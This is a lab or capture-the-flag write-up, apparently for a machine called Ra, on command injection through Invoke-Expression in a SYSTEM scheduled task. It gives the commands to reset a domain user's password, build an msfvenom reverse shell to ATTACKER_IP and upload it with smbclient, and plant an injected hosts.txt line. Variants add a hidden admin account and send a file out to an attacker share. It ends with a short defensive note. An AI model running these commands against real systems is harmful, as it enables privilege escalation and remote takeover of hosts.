# Invoke-Expression on User-Controlled File — Scheduled Task RCE

Used on: **Ra**

## Summary

A PowerShell scheduled task or service reads hostnames from a file owned by a
low-privilege user and passes them to `Invoke-Expression`. Because `Invoke-Expression`
executes arbitrary strings as PowerShell code, an attacker who can write to that file
injects a payload that runs as SYSTEM.

## Description

`Invoke-Expression` (alias `iex`) evaluates a string as a PowerShell command. Scripts
that build a command string by embedding file contents — rather than using safe APIs —
are vulnerable to code injection via semicolons or any PowerShell statement terminator.

Pattern in `checkservers.ps1`:

```powershell
$p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
Invoke-Expression $p
```

If `$_` comes from a file the attacker writes, `$_` = `localhost; <payload>` breaks out
of the Test-Connection call and executes the payload in the same context (SYSTEM).

## Prerequisites

- Write access to the file read by the scheduled script (via SMB or direct filesystem)
- The script runs as SYSTEM or a high-privilege account
- Ability to place or reference an executable on the target (SMB share, upload)
- Account that can reset the file owner's password (e.g. **Account Operators** group)

## Step-by-Step

### 1. Identify the scheduled script and its input file

```powershell
# On the target — check C:\scripts\
dir C:\scripts\
type C:\scripts\checkservers.ps1
# → reads C:\Users\brittanycr\hosts.txt and calls Invoke-Expression
```

### 2. Check script execution frequency

```bash
# Log timestamp confirms it runs automatically
dir C:\scripts\log.txt
```

### 3. Gain write access to the input file owner's account

As a member of **Account Operators**, reset the file owner's (brittanycr) password:

```powershell
net user brittanycr Password123! /domain
```

Verify SMB access (WinRM not required):

```bash
netexec smb $TARGET -u brittanycr -p 'Password123!'
```

### 4. Generate a reverse shell payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=ATTACKER_IP LPORT=1337 \
  -f exe -o /tmp/shell.exe
```

### 5. Upload the payload and the malicious hosts.txt

```bash
# Upload the reverse shell binary
smbclient //$TARGET/Users \
  -U 'brittanycr%Password123!' \
  -c "cd brittanycr; put /tmp/shell.exe shell.exe"

# Build the injection payload
echo 'localhost; C:\Users\brittanycr\shell.exe' > /tmp/hosts.txt

# Upload the malicious hosts.txt
smbclient //$TARGET/Users \
  -U 'brittanycr%Password123!' \
  -c "cd brittanycr; put /tmp/hosts.txt hosts.txt"
```

### 6. Catch the shell

```bash
rlwrap nc -lvnp 1337
```

Wait ~45 seconds for the scheduled task to fire:

```
whoami
# nt authority\system
```

## Variants

- Instead of an EXE, add a local admin via `net user hacker P@ss1 /add` + `net localgroup administrators hacker /add`.
- Write a malicious `hosts.txt` that exfiltrates data: `localhost; (Get-Content C:\Users\Administrator\Desktop\Flag3.txt) | Out-File \\ATTACKER_IP\share\flag.txt`.
- If SMB signing is disabled, relay the NTLM instead of cracking.

## Defensive Note

Never pass user-controlled file contents directly to `Invoke-Expression` or `iex`.
Use `Test-Connection` directly with validated hostname patterns (regex allow-list).
Restrict write access to directories read by scheduled tasks running as SYSTEM.
